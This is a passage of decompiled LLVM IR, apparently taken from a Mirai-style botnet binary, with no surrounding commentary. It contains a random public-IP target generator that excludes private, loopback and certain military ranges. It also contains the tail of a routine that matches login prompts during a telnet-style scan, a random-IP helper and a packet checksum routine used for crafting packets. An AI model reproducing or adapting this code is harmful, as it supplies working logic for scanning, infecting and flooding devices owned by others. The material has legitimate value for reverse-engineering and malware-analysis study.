  %v2_8049a4c = load i8, i8* %v5_8049a00, align 1
  %v11_8049a4f = icmp eq i8 %v2_8049a4c, -1
  %v1_8049a51 = icmp eq i1 %v11_8049a4f, false
  br i1 %v1_8049a51, label %dec_label_pc_8049ac4, label %dec_label_pc_8049a53

dec_label_pc_8049a53:                             ; preds = %dec_label_pc_8049a43
  %v1_8049a56 = add i32 %v6_80499fd, 1
  %v4_8049a71 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049a56, i32 2, i32 0)
  %v13_8049a79 = icmp eq i32 %v4_8049a71, -1
  br i1 %v13_8049a79, label %dec_label_pc_8049b3b, label %dec_label_pc_8049a7f

dec_label_pc_8049a7f:                             ; preds = %dec_label_pc_8049a53
  %v4_8049a7f = icmp eq i32 %v4_8049a71, 0
  %v1_8049a83 = icmp eq i1 %v4_8049a7f, false
  br i1 %v1_8049a83, label %dec_label_pc_8049a94, label %dec_label_pc_8049b3b

dec_label_pc_8049a94:                             ; preds = %dec_label_pc_8049a7f
  %v5_8049a97 = add i32 %v4_8049a71, %v5_8049a46
  %v3_8049aaf = call i32 @negotiate(i32 %arg1, i32 %v6_80499fd, i32 3)
  %v1_8049ab4 = icmp eq i32 %v3_8049aaf, 0
  %v1_8049ab6 = icmp eq i1 %v1_8049ab4, false
  br i1 %v1_8049ab6, label %dec_label_pc_8049af8.backedge, label %dec_label_pc_8049b3b

dec_label_pc_8049af8.backedge:                    ; preds = %dec_label_pc_8049a94, %dec_label_pc_8049ada, %dec_label_pc_8049ae0
  %stack_var_-32.0.be = phi i32 [ %v5_8049a46, %dec_label_pc_8049ada ], [ %v5_8049a46, %dec_label_pc_8049ae0 ], [ %v5_8049a97, %dec_label_pc_8049a94 ]
  %v1_8049afb = add i32 %stack_var_-32.0.be, 2
  %v5_8049b01 = icmp slt i32 %v1_8049afb, %arg7
  br i1 %v5_8049b01, label %dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge, label %dec_label_pc_8049b1f

dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge: ; preds = %dec_label_pc_8049af8.backedge
  %v3_8049b03.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049b03

dec_label_pc_8049ac4:                             ; preds = %dec_label_pc_8049a43
  %v3_8049ad1 = call i32 @strstr(i32 %v5_80499fd, i8* %v2_8049ad1)
  %v1_8049ad6 = icmp eq i32 %v3_8049ad1, 0
  %v1_8049ad8 = icmp eq i1 %v1_8049ad6, false
  br i1 %v1_8049ad8, label %dec_label_pc_8049b1f, label %dec_label_pc_8049ada

dec_label_pc_8049ada:                             ; preds = %dec_label_pc_8049ac4
  br i1 %v4_8049ada, label %dec_label_pc_8049af8.backedge, label %dec_label_pc_8049ae0

dec_label_pc_8049ae0:                             ; preds = %dec_label_pc_8049ada
  %v2_8049ae6 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049aeb = icmp eq i32 %v2_8049ae6, 0
  br i1 %v1_8049aeb, label %dec_label_pc_8049af8.backedge, label %dec_label_pc_8049b1f

dec_label_pc_8049b03:                             ; preds = %dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge, %dec_label_pc_8049b03.lr.ph
  %v3_8049b03 = phi i32 [ %arg4, %dec_label_pc_8049b03.lr.ph ], [ %v3_8049b03.pre, %dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049b03.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge ]
  %tmp29 = icmp slt i32 %v3_8049b03, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_8049993, label %dec_label_pc_8049b11

dec_label_pc_8049b11:                             ; preds = %dec_label_pc_8049b03
  br i1 %tmp32, label %dec_label_pc_8049993, label %dec_label_pc_8049b1f

dec_label_pc_8049b1f:                             ; preds = %dec_label_pc_8049993, %dec_label_pc_8049b11, %dec_label_pc_8049af8.backedge, %dec_label_pc_8049ae0, %dec_label_pc_8049ac4, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049ac4 ], [ 1, %dec_label_pc_8049ae0 ], [ 0, %dec_label_pc_8049af8.backedge ], [ 0, %dec_label_pc_8049b11 ], [ 0, %dec_label_pc_8049993 ]
  br label %dec_label_pc_8049b3b

dec_label_pc_8049b3b:                             ; preds = %dec_label_pc_8049a94, %dec_label_pc_8049a53, %dec_label_pc_8049a7f, %dec_label_pc_80499fa, %dec_label_pc_8049a2e, %dec_label_pc_8049b1f
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049b1f ], [ 0, %dec_label_pc_8049a2e ], [ 0, %dec_label_pc_80499fa ], [ 0, %dec_label_pc_8049a7f ], [ 0, %dec_label_pc_8049a53 ], [ 0, %dec_label_pc_8049a94 ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049a71, { 1, 2, 0 }
  uselistorder i32 %v4_8049a20, { 1, 2, 0 }
  uselistorder i32 %v5_80499fd, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049b3b, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049b1f, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049af8.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8049b4d = load i32, i32* @edi, align 4
  %v0_8049b4f = load i32, i32* @ebx, align 4
  store i32 %v0_8049b4f, i32* %stack_var_-16, align 4
  %v1_8049b53 = call i32 @random()
  %v2_8049b75 = sdiv i32 %v1_8049b53, 49
  store i32 %v2_8049b75, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049b75, -223
  %v2_8049b90 = add i32 %v1_8049b53, %tmp
  %v14_8049b90 = trunc i32 %v2_8049b90 to i8
  store i32 %v2_8049b90, i32* @eax, align 4
  store i8 %v14_8049b90, i8* @global_var_805a6fb.36, align 1
  %v1_8049b9e = call i32 @random()
  %v2_8049bc0 = sdiv i32 %v1_8049b9e, 51
  store i32 %v2_8049bc0, i32* @ebx, align 4
  %tmp39 = mul i32 %v2_8049bc0, -255
  %v2_8049bd0 = add i32 %v1_8049b9e, %tmp39
  %v14_8049bd0 = trunc i32 %v2_8049bd0 to i8
  store i32 %v2_8049bd0, i32* @eax, align 4
  store i8 %v14_8049bd0, i8* @global_var_805a6fc.37, align 4
  %v1_8049bde = call i32 @random()
  %v2_8049c00 = sdiv i32 %v1_8049bde, 51
  store i32 %v2_8049c00, i32* @ebx, align 4
  %tmp40 = mul i32 %v2_8049c00, -255
  %v2_8049c10 = add i32 %v1_8049bde, %tmp40
  %v14_8049c10 = trunc i32 %v2_8049c10 to i8
  store i32 %v2_8049c10, i32* @eax, align 4
  store i8 %v14_8049c10, i8* @global_var_805a6fd.38, align 1
  %v1_8049c1e = call i32 @random()
  %v2_8049c40 = sdiv i32 %v1_8049c1e, 51
  store i32 %v2_8049c40, i32* @ebx, align 4
  %tmp41 = mul i32 %v2_8049c40, -255
  %v2_8049c50 = add i32 %v1_8049c1e, %tmp41
  br label %dec_label_pc_8049d6e

dec_label_pc_8049c63:                             ; preds = %dec_label_pc_8049f3d, %dec_label_pc_8049f2e, %dec_label_pc_8049f1f, %dec_label_pc_8049f10, %dec_label_pc_8049f01, %dec_label_pc_8049ef2, %dec_label_pc_8049ee3, %dec_label_pc_8049ed4, %dec_label_pc_8049ec5, %dec_label_pc_8049eb6, %dec_label_pc_8049ea7, %dec_label_pc_8049e98, %dec_label_pc_8049e89, %dec_label_pc_8049e7a, %dec_label_pc_8049e6b, %dec_label_pc_8049e46, %dec_label_pc_8049e2c, %dec_label_pc_8049e07, %dec_label_pc_8049de2, %dec_label_pc_8049dc8, %dec_label_pc_8049db9, %dec_label_pc_8049daa, %dec_label_pc_8049d9b, %dec_label_pc_8049d8c, %dec_label_pc_8049d7d, %dec_label_pc_8049d6e
  %v0_8049c63 = call i32 @random()
  %v2_8049c85 = sdiv i32 %v0_8049c63, 49
  store i32 %v2_8049c85, i32* @ebx, align 4
  %tmp42 = mul i32 %v2_8049c85, -223
  %v2_8049ca0 = add i32 %v0_8049c63, %tmp42
  %v14_8049ca0 = trunc i32 %v2_8049ca0 to i8
  store i32 %v2_8049ca0, i32* @eax, align 4
  store i8 %v14_8049ca0, i8* @global_var_805a6fb.36, align 1
  %v1_8049cae = call i32 @random()
  %v2_8049cd0 = sdiv i32 %v1_8049cae, 51
  store i32 %v2_8049cd0, i32* @ebx, align 4
  %tmp43 = mul i32 %v2_8049cd0, -255
  %v2_8049ce0 = add i32 %v1_8049cae, %tmp43
  %v14_8049ce0 = trunc i32 %v2_8049ce0 to i8
  store i32 %v2_8049ce0, i32* @eax, align 4
  store i8 %v14_8049ce0, i8* @global_var_805a6fc.37, align 4
  %v1_8049cee = call i32 @random()
  %v2_8049d10 = sdiv i32 %v1_8049cee, 51
  store i32 %v2_8049d10, i32* @ebx, align 4
  %tmp44 = mul i32 %v2_8049d10, -255
  %v2_8049d20 = add i32 %v1_8049cee, %tmp44
  %v14_8049d20 = trunc i32 %v2_8049d20 to i8
  store i32 %v2_8049d20, i32* @eax, align 4
  store i8 %v14_8049d20, i8* @global_var_805a6fd.38, align 1
  %v1_8049d2e = call i32 @random()
  %v2_8049d50 = sdiv i32 %v1_8049d2e, 51
  store i32 %v2_8049d50, i32* @ebx, align 4
  %tmp45 = mul i32 %v2_8049d50, -255
  %v2_8049d60 = add i32 %v1_8049d2e, %tmp45
  br label %dec_label_pc_8049d6e

dec_label_pc_8049d6e:                             ; preds = %entry, %dec_label_pc_8049c63
  %storemerge13.in = phi i32 [ %v2_8049d60, %dec_label_pc_8049c63 ], [ %v2_8049c50, %entry ]
  %v14_8049c50 = trunc i32 %storemerge13.in to i8
  store i8 %v14_8049c50, i8* @global_var_805a6fe.39, align 2
  %v0_8049d6e = load i8, i8* @global_var_805a6fb.36, align 1
  %v1_8049d6e = zext i8 %v0_8049d6e to i32
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049d75 = icmp eq i8 %v0_8049d6e, 127
  br i1 %v10_8049d75, label %dec_label_pc_8049c63, label %dec_label_pc_8049d7d

dec_label_pc_8049d7d:                             ; preds = %dec_label_pc_8049d6e
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v4_8049d84 = icmp eq i8 %v0_8049d6e, 0
  br i1 %v4_8049d84, label %dec_label_pc_8049c63, label %dec_label_pc_8049d8c

dec_label_pc_8049d8c:                             ; preds = %dec_label_pc_8049d7d
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049d93 = icmp eq i8 %v0_8049d6e, 3
  br i1 %v10_8049d93, label %dec_label_pc_8049c63, label %dec_label_pc_8049d9b

dec_label_pc_8049d9b:                             ; preds = %dec_label_pc_8049d8c
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049da2 = icmp eq i8 %v0_8049d6e, 15
  br i1 %v10_8049da2, label %dec_label_pc_8049c63, label %dec_label_pc_8049daa

dec_label_pc_8049daa:                             ; preds = %dec_label_pc_8049d9b
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v7_8049db1 = icmp eq i8 %v0_8049d6e, 16
  br i1 %v7_8049db1, label %dec_label_pc_8049c63, label %dec_label_pc_8049db9

dec_label_pc_8049db9:                             ; preds = %dec_label_pc_8049daa
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049dc0 = icmp eq i8 %v0_8049d6e, 56
  br i1 %v10_8049dc0, label %dec_label_pc_8049c63, label %dec_label_pc_8049dc8

dec_label_pc_8049dc8:                             ; preds = %dec_label_pc_8049db9
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049dcf = icmp eq i8 %v0_8049d6e, 10
  br i1 %v10_8049dcf, label %dec_label_pc_8049c63, label %dec_label_pc_8049dd7

dec_label_pc_8049dd7:                             ; preds = %dec_label_pc_8049dc8
  %v8_8049dde = icmp eq i8 %v0_8049d6e, -64
  %v1_8049de0 = icmp eq i1 %v8_8049dde, false
  br i1 %v1_8049de0, label %dec_label_pc_8049df1, label %dec_label_pc_8049de2

dec_label_pc_8049de2:                             ; preds = %dec_label_pc_8049dd7
  %v0_8049de2 = load i8, i8* @global_var_805a6fc.37, align 4
  %v1_8049de2 = zext i8 %v0_8049de2 to i32
  store i32 %v1_8049de2, i32* @eax, align 4
  %v11_8049de9 = icmp eq i8 %v0_8049de2, -88
  br i1 %v11_8049de9, label %dec_label_pc_8049c63, label %dec_label_pc_8049df1

dec_label_pc_8049df1:                             ; preds = %dec_label_pc_8049de2, %dec_label_pc_8049dd7
  %v11_8049df8 = icmp eq i8 %v0_8049d6e, -84
  %v1_8049dfa = icmp eq i1 %v11_8049df8, false
  br i1 %v1_8049dfa, label %dec_label_pc_8049e16, label %dec_label_pc_8049dfc

dec_label_pc_8049dfc:                             ; preds = %dec_label_pc_8049df1
  %v0_8049dfc = load i8, i8* @global_var_805a6fc.37, align 4
  %tmp46 = icmp ult i8 %v0_8049dfc, 16
  br i1 %tmp46, label %dec_label_pc_8049e16, label %dec_label_pc_8049e07

dec_label_pc_8049e07:                             ; preds = %dec_label_pc_8049dfc
  %v1_8049dfc = zext i8 %v0_8049dfc to i32
  store i32 %v1_8049dfc, i32* @eax, align 4
  %tmp47 = icmp ult i8 %v0_8049dfc, 32
  br i1 %tmp47, label %dec_label_pc_8049c63, label %dec_label_pc_8049e16

dec_label_pc_8049e16:                             ; preds = %dec_label_pc_8049e07, %dec_label_pc_8049dfc, %dec_label_pc_8049df1
  %v10_8049e1d = icmp eq i8 %v0_8049d6e, 100
  %v1_8049e1f = icmp eq i1 %v10_8049e1d, false
  br i1 %v1_8049e1f, label %dec_label_pc_8049e3b, label %dec_label_pc_8049e21

dec_label_pc_8049e21:                             ; preds = %dec_label_pc_8049e16
  %v0_8049e21 = load i8, i8* @global_var_805a6fc.37, align 4
  %tmp48 = icmp ult i8 %v0_8049e21, 64
  br i1 %tmp48, label %dec_label_pc_8049e3b, label %dec_label_pc_8049e2c

dec_label_pc_8049e2c:                             ; preds = %dec_label_pc_8049e21
  %v1_8049e21 = zext i8 %v0_8049e21 to i32
  store i32 %v1_8049e21, i32* @eax, align 4
  %tmp49 = icmp ult i8 %v0_8049e21, 127
  br i1 %tmp49, label %dec_label_pc_8049c63, label %dec_label_pc_8049e3b

dec_label_pc_8049e3b:                             ; preds = %dec_label_pc_8049e2c, %dec_label_pc_8049e21, %dec_label_pc_8049e16
  %v11_8049e42 = icmp eq i8 %v0_8049d6e, -87
  %v1_8049e44 = icmp eq i1 %v11_8049e42, false
  br i1 %v1_8049e44, label %dec_label_pc_8049e55, label %dec_label_pc_8049e46

dec_label_pc_8049e46:                             ; preds = %dec_label_pc_8049e3b
  %v0_8049e46 = load i8, i8* @global_var_805a6fc.37, align 4
  %v1_8049e46 = zext i8 %v0_8049e46 to i32
  store i32 %v1_8049e46, i32* @eax, align 4
  %v11_8049e4d = icmp eq i8 %v0_8049e46, -1
  br i1 %v11_8049e4d, label %dec_label_pc_8049c63, label %dec_label_pc_8049e55

dec_label_pc_8049e55:                             ; preds = %dec_label_pc_8049e46, %dec_label_pc_8049e3b
  %v11_8049e5c = icmp eq i8 %v0_8049d6e, -58
  %v1_8049e5e = icmp eq i1 %v11_8049e5c, false
  br i1 %v1_8049e5e, label %dec_label_pc_8049e7a, label %dec_label_pc_8049e60

dec_label_pc_8049e60:                             ; preds = %dec_label_pc_8049e55
  %v0_8049e60 = load i8, i8* @global_var_805a6fc.37, align 4
  %tmp50 = icmp ult i8 %v0_8049e60, 18
  br i1 %tmp50, label %dec_label_pc_8049e7a, label %dec_label_pc_8049e6b

dec_label_pc_8049e6b:                             ; preds = %dec_label_pc_8049e60
  %v1_8049e60 = zext i8 %v0_8049e60 to i32
  store i32 %v1_8049e60, i32* @eax, align 4
  %tmp51 = or i8 %v0_8049e60, 1
  %tmp52 = icmp eq i8 %tmp51, 19
  br i1 %tmp52, label %dec_label_pc_8049c63, label %dec_label_pc_8049e7a

dec_label_pc_8049e7a:                             ; preds = %dec_label_pc_8049e6b, %dec_label_pc_8049e60, %dec_label_pc_8049e55
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v8_8049e81 = icmp eq i8 %v0_8049d6e, -32
  br i1 %v8_8049e81, label %dec_label_pc_8049c63, label %dec_label_pc_8049e89

dec_label_pc_8049e89:                             ; preds = %dec_label_pc_8049e7a
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049e90 = icmp eq i8 %v0_8049d6e, 6
  br i1 %v10_8049e90, label %dec_label_pc_8049c63, label %dec_label_pc_8049e98

dec_label_pc_8049e98:                             ; preds = %dec_label_pc_8049e89
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049e9f = icmp eq i8 %v0_8049d6e, 7
  br i1 %v10_8049e9f, label %dec_label_pc_8049c63, label %dec_label_pc_8049ea7

dec_label_pc_8049ea7:                             ; preds = %dec_label_pc_8049e98
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049eae = icmp eq i8 %v0_8049d6e, 11
  br i1 %v10_8049eae, label %dec_label_pc_8049c63, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049ea7
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049ebd = icmp eq i8 %v0_8049d6e, 21
  br i1 %v10_8049ebd, label %dec_label_pc_8049c63, label %dec_label_pc_8049ec5

dec_label_pc_8049ec5:                             ; preds = %dec_label_pc_8049eb6
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049ecc = icmp eq i8 %v0_8049d6e, 22
  br i1 %v10_8049ecc, label %dec_label_pc_8049c63, label %dec_label_pc_8049ed4

dec_label_pc_8049ed4:                             ; preds = %dec_label_pc_8049ec5
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049edb = icmp eq i8 %v0_8049d6e, 26
  br i1 %v10_8049edb, label %dec_label_pc_8049c63, label %dec_label_pc_8049ee3

dec_label_pc_8049ee3:                             ; preds = %dec_label_pc_8049ed4
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049eea = icmp eq i8 %v0_8049d6e, 28
  br i1 %v10_8049eea, label %dec_label_pc_8049c63, label %dec_label_pc_8049ef2

dec_label_pc_8049ef2:                             ; preds = %dec_label_pc_8049ee3
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049ef9 = icmp eq i8 %v0_8049d6e, 29
  br i1 %v10_8049ef9, label %dec_label_pc_8049c63, label %dec_label_pc_8049f01

dec_label_pc_8049f01:                             ; preds = %dec_label_pc_8049ef2
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049f08 = icmp eq i8 %v0_8049d6e, 30
  br i1 %v10_8049f08, label %dec_label_pc_8049c63, label %dec_label_pc_8049f10

dec_label_pc_8049f10:                             ; preds = %dec_label_pc_8049f01
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049f17 = icmp eq i8 %v0_8049d6e, 33
  br i1 %v10_8049f17, label %dec_label_pc_8049c63, label %dec_label_pc_8049f1f

dec_label_pc_8049f1f:                             ; preds = %dec_label_pc_8049f10
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049f26 = icmp eq i8 %v0_8049d6e, 55
  br i1 %v10_8049f26, label %dec_label_pc_8049c63, label %dec_label_pc_8049f2e

dec_label_pc_8049f2e:                             ; preds = %dec_label_pc_8049f1f
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v11_8049f35 = icmp eq i8 %v0_8049d6e, -42
  br i1 %v11_8049f35, label %dec_label_pc_8049c63, label %dec_label_pc_8049f3d

dec_label_pc_8049f3d:                             ; preds = %dec_label_pc_8049f2e
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v11_8049f44 = icmp eq i8 %v0_8049d6e, -41
  br i1 %v11_8049f44, label %dec_label_pc_8049c63, label %dec_label_pc_8049f4c

dec_label_pc_8049f4c:                             ; preds = %dec_label_pc_8049f3d
  store i32 0, i32* %stack_var_-32, align 4
  %v1_8049f68 = urem i32 %storemerge13.in, 256
  store i32 %v1_8049f68, i32* @edx, align 4
  %v0_8049f7c = load i8, i8* @global_var_805a6fc.37, align 4
  %v1_8049f7c = zext i8 %v0_8049f7c to i32
  store i32 %v1_8049f7c, i32* @ebx, align 4
  %v2_8049f95 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8049f95, i32* @edi, align 4
  %v4_8049faf = call i32 @szprintf(i32 %v2_8049f95, i32 ptrtoint ([12 x i8]* @global_var_80566ec.40 to i32), i32 %v1_8049d6e)
  %v1_8049fba = call i32 @inet_addr(i32 %v2_8049f95)
  %v2_8049fc2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8049fc2, i32* @ebx, align 4
  store i32 %v0_8049b4d, i32* @edi, align 4
  ret i32 %v1_8049fba

; uselistorder directives
  uselistorder i8 %v0_8049e60, { 0, 2, 1 }
  uselistorder i8 %v0_8049e21, { 0, 2, 1 }
  uselistorder i8 %v0_8049dfc, { 0, 2, 1 }
  uselistorder i8 %v0_8049d6e, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32 %v2_8049d20, { 1, 0 }
  uselistorder i32 %v2_8049ce0, { 1, 0 }
  uselistorder i32 %v2_8049ca0, { 1, 0 }
  uselistorder i32 %v2_8049c10, { 1, 0 }
  uselistorder i32 %v2_8049bd0, { 1, 0 }
  uselistorder i32 %v2_8049b90, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i8* @global_var_805a6fd.38, { 1, 0 }
  uselistorder i8* @global_var_805a6fc.37, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805a6fb.36, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049d6e, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049fc7 = load i32, i32* @ebp, align 4
  store i32 %v0_8049fc7, i32* %stack_var_-4, align 4
  %v0_8049fcd = load i32, i32* @global_var_8060968.41, align 8
  %v1_8049fd5 = call i32 @ntohl(i32 %v0_8049fcd)
  %v5_8049fda = and i32 %v1_8049fd5, %arg1
  %v1_8049fe0 = call i32 @rand_cmwc(i32 %v5_8049fda)
  %v1_8049fea = sub i32 -1, %arg1
  %v2_8049fec = and i32 %v1_8049fe0, %v1_8049fea
  %v5_8049fee = xor i32 %v2_8049fec, %v5_8049fda
  %v2_8049ff1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049ff1, i32* @ebp, align 4
  ret i32 %v5_8049fee
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049ff8 = load i32, i32* @ebx, align 4
  %v4_804a02733 = add i32 %arg2, -1
  %v9_804a02734 = sub i32 0, %arg2
  %v10_804a02735 = and i32 %arg2, %v9_804a02734
  %v11_804a02736 = icmp slt i32 %v10_804a02735, 0
  %v12_804a02737 = icmp eq i32 %v4_804a02733, 0
  %v13_804a02738 = icmp slt i32 %v4_804a02733, 0
  %v3_804a02b39 = icmp eq i1 %v13_804a02738, %v11_804a02736
  %v4_804a02b40 = icmp eq i1 %v12_804a02737, false
  %v5_804a02b41 = and i1 %v4_804a02b40, %v3_804a02b39
  br i1 %v5_804a02b41, label %dec_label_pc_804a00c, label %dec_label_pc_804a02d

dec_label_pc_804a00c:                             ; preds = %entry, %dec_label_pc_804a00c
  %stack_var_-24.045 = phi i16 [ %v9_804a01c, %dec_label_pc_804a00c ], [ 0, %entry ]
  %stack_var_8.044 = phi i32 [ %v4_804a023, %dec_label_pc_804a00c ], [ %arg2, %entry ]
  %stack_var_4.043 = phi i16* [ %v23_804a01f, %dec_label_pc_804a00c ], [ %arg1, %entry ]
  %v3_804a01942 = phi i32 [ %v6_804a019, %dec_label_pc_804a00c ], [ 0, %entry ]
  %v4_804a00c = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804a00f = load i16, i16* %stack_var_4.043, align 2
  %v3_804a00f = zext i16 %v2_804a00f to i32
  %sext51 = mul i32 %v3_804a01942, 65536
  %v4_804a019 = sdiv i32 %sext51, 65536
  %v6_804a019 = add nsw i32 %v3_804a00f, %v4_804a019
  %v11_804a019 = icmp ult i32 %v6_804a019, %v4_804a019
  %v26_804a019 = trunc i32 %v6_804a019 to i16
  %v7_804a01c = zext i1 %v11_804a019 to i16
  %v9_804a01c = add i16 %v7_804a01c, %stack_var_-24.045
  %v5_804a01f = add i32 %v4_804a00c, 2
  %v23_804a01f = inttoptr i32 %v5_804a01f to i16*
  %v4_804a023 = add i32 %stack_var_8.044, -2
  %v4_804a027 = add i32 %stack_var_8.044, -3
  %v9_804a027 = sub i32 2, %stack_var_8.044
  %v10_804a027 = and i32 %v4_804a023, %v9_804a027
  %v11_804a027 = icmp slt i32 %v10_804a027, 0
  %v12_804a027 = icmp eq i32 %v4_804a027, 0
  %v13_804a027 = icmp slt i32 %v4_804a027, 0
  %v3_804a02b = icmp eq i1 %v13_804a027, %v11_804a027
  %v4_804a02b = icmp eq i1 %v12_804a027, false
  %v5_804a02b = and i1 %v4_804a02b, %v3_804a02b
  br i1 %v5_804a02b, label %dec_label_pc_804a00c, label %dec_label_pc_804a02d

dec_label_pc_804a02d:                             ; preds = %dec_label_pc_804a00c, %entry
  %v3_804a019.lcssa = phi i16 [ 0, %entry ], [ %v26_804a019, %dec_label_pc_804a00c ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804a01f, %dec_label_pc_804a00c ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804a023, %dec_label_pc_804a00c ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804a01c, %dec_label_pc_804a00c ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804a06e.preheader, label %dec_label_pc_804a033

dec_label_pc_804a033:                             ; preds = %dec_label_pc_804a02d
  %v1_804a036 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804a036 = load i8, i8* %v1_804a036, align 1
  %v3_804a036 = zext i8 %v2_804a036 to i32
  %v4_804a041 = sext i16 %v3_804a019.lcssa to i32
  %v6_804a041 = add nsw i32 %v3_804a036, %v4_804a041
  %v11_804a041 = icmp ult i32 %v6_804a041, %v4_804a041
  %v26_804a041 = trunc i32 %v6_804a041 to i16
  %v7_804a044 = zext i1 %v11_804a041 to i16
  %v9_804a044 = add i16 %v7_804a044, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804a06e.preheader

dec_label_pc_804a06e.preheader:                   ; preds = %dec_label_pc_804a033, %dec_label_pc_804a02d
  %v3_804a053.ph = phi i16 [ %v3_804a019.lcssa, %dec_label_pc_804a02d ], [ %v26_804a041, %dec_label_pc_804a033 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804a02d ], [ %v9_804a044, %dec_label_pc_804a033 ]
  %v4_804a06e20 = sext i16 %v3_804a053.ph to i32
  %v4_804a07121 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804a07422 = udiv i32 %v4_804a06e20, 65536
  %v4_804a07423 = mul i32 %v4_804a07121, 65536
  %v5_804a07424 = or i32 %v4_804a07423, %v3_804a07422
  %v2_804a07825 = udiv i32 %v4_804a07121, 65536
  %v2_804a07b26 = or i32 %v5_804a07424, %v2_804a07825
  %v3_804a07b27 = icmp eq i32 %v2_804a07b26, 0
  %v1_804a07f28 = icmp eq i1 %v3_804a07b27, false
  br i1 %v1_804a07f28, label %dec_label_pc_804a049, label %dec_label_pc_804a081

dec_label_pc_804a049:                             ; preds = %dec_label_pc_804a06e.preheader, %dec_label_pc_804a049
  %v2_804a07831 = phi i32 [ %v2_804a078, %dec_label_pc_804a049 ], [ %v2_804a07825, %dec_label_pc_804a06e.preheader ]
  %v5_804a07430 = phi i32 [ %v5_804a074, %dec_label_pc_804a049 ], [ %v5_804a07424, %dec_label_pc_804a06e.preheader ]
  %v4_804a06e29 = phi i32 [ %v4_804a06e, %dec_label_pc_804a049 ], [ %v4_804a06e20, %dec_label_pc_804a06e.preheader ]
  %v2_804a064 = add i32 %v5_804a07430, %v4_804a06e29
  %v7_804a064 = icmp ult i32 %v2_804a064, %v4_804a06e29
  %v3_804a066 = zext i1 %v7_804a064 to i32
  %v5_804a066 = add nuw nsw i32 %v3_804a066, %v2_804a07831
  %sext = mul i32 %v2_804a064, 65536
  %v4_804a06e = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804a066, 65536
  %v4_804a071 = sdiv i32 %sext50, 65536
  %v3_804a074 = udiv i32 %v4_804a06e, 65536
  %v5_804a074 = or i32 %sext50, %v3_804a074
  %v2_804a078 = udiv i32 %v4_804a071, 65536
  %v2_804a07b = or i32 %v5_804a074, %v2_804a078
  %v3_804a07b = icmp eq i32 %v2_804a07b, 0
  %v1_804a07f = icmp eq i1 %v3_804a07b, false
